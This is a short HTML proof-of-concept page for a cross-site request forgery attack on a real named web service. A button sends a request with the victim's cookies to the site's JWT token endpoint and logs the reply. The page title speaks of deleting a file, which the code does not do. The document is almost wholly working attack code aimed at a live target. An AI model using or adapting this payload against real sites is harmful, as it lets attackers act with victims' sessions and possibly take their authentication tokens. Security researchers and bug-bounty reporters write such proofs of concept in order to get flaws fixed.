<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC - AJAX GET Delete</title>
</head>
<body>
  <h2>CSRF PoC - Trigger File Delete</h2>
  <button onclick="exploit()">Trigger Delete</button>

  <script>
    function exploit() {
      fetch("https://www.datacamp.com/api/jwt/token", {
        method: "GET",
        credentials: "include", // send victim cookies
        headers: {
          "X-Requested-With": "XMLHttpRequest",
          "Accept": "application/json, text/plain, */*"
        }
      })
      .then(r => r.text())
      .then(console.log);
    }
  </script>
</body>
